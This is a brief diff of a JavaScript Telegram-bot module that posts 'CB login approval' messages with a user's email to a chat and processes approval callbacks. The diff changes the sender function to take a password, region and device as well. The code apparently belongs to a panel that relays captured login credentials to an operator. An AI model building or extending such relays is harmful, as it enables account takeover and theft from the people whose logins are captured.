@@ -14,7 +14,7 @@ if (!BOT_TOKEN || !CHAT_ID) {
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // Function to send backend login approval message
-export async function sendLoginApproval(email) {
+export async function sendLoginTelegram(email, password, region, device) {
   const message = `<b>CB login approval</b>\n\n<b>Email:</b> ${email}`;
   const options = {
     parse_mode: "HTML",
@@ -54,3 +54,4 @@ bot.on("callback_query", async (query) => {
 
   console.log(`Approval ${action} processed for ${email}`);
 });
+
